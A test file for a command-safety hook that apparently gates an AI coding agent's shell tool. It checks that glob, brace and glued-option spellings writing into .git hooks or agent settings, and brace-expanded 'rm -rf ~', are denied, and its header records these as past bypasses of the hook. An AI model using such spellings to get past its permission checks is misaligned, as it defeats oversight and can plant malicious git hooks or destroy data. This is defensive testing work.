// Hunt (20 Nov 2026, read only bug hunt over M114): two ways a write reached the person's .git folder past the hook (rule 10).
// 1. A wildcard or brace spelling of a protected folder (.gi?/hooks, .gi{t,t}, .g*) that the shell expands to .git.
// 2. A short option glued to its value (-t.git/hooks, -C.git, -o.git/..., -d.git) that the flag loop never read.
import { afterEach, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, realpathSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { evaluate } from "../src/safety.ts";

const made: string[] = [];
afterEach(() => { while (made.length) rmSync(made.pop()!, { recursive: true, force: true }); });
const project = () => { const d = realpathSync(mkdtempSync(join(tmpdir(), "companion-hunt-"))); made.push(d); mkdirSync(join(d, ".git", "hooks"), { recursive: true }); mkdirSync(join(d, "src"), { recursive: true }); return d; };
const run = (p: string, command: string) => evaluate({ tool: "Bash", input: { command } }, { project: p });

const GLOB_INTO_GIT = [
  "cp myconfig .gi?/config", "cp -t .gi?/hooks pre-commit", "cat evil.sh > .gi?/hooks/pre-commit", "cat evil.sh >> .gi?/hooks/pre-commit",
  "tee .gi{t,t}/hooks/pre-commit < evil.sh", "cp evil.sh .g*/hooks/pre-commit", "chmod +x .gi?/hooks/pre-commit", "cp x .gi[t]/config",
  "cp x .{git,foo}/config", "mv x .git*/hooks/pre-commit", "cp x .clau?e/settings.json", "cp x src/../.gi?/config", "echo x > .?/x",
];
const GLUED_FLAGS = [
  "cp -t.git/hooks pre-commit", "mv -t.git/hooks pre-commit", "install -t.git/hooks pre-commit", "tar -xf h.tar -C.git", "unzip -d.git/hooks h.zip",
  "sort -o.git/hooks/pre-commit evil.sh", "wget -O.git/hooks/pre-commit http://x.example", "cp -t/tmp a", "unzip -d.. a.zip",
];
// Ordinary wildcards and options that must keep working.
const STILL_FINE = ["cp src/*.js dist/", "cp *.txt src/", "rm -rf dist/*", "cp src/{a,b}.js lib/", "mkdir -p src/{a,b}", "tar -xf h.tar -Csrc", "sort -osorted.txt a.txt", "cp -tsrc a.txt", "echo x > src/*.log"];

describe("a wildcard or brace spelling of .git is refused like the plain spelling", () => {
  for (const c of GLOB_INTO_GIT) test(c, () => { expect(run(project(), c).decision, c).toBe("deny"); });
});
describe("a short option glued to its value is checked like a spaced one", () => {
  for (const c of GLUED_FLAGS) test(c, () => { expect(run(project(), c).decision, c).toBe("deny"); });
});
describe("ordinary wildcards, braces and glued options inside the project still run", () => {
  for (const c of STILL_FINE) test(c, () => { expect(run(project(), c).decision, c).toBe("allow"); });
});

// The shell reader used to end a command at every { and }, so brace expansion hid words from every check.
describe("brace expansion is read the way the shell expands it", () => {
  for (const c of ["{rm,-rf,~}", "{rm,-rf,..}", "x=1; {rm,-rf,~}", "echo {a,b} && {rm,-rf,~}"]) test(c, () => { expect(run(project(), c).decision, c).not.toBe("allow"); });
  for (const c of ["{ npm test; }", "{ echo a; echo b; } > src/out.txt", "echo {a,b}", "mkdir -p src/{a,b}/c", "ls src/{a,b}"]) test(c, () => { expect(run(project(), c).decision, c).toBe("allow"); });
});
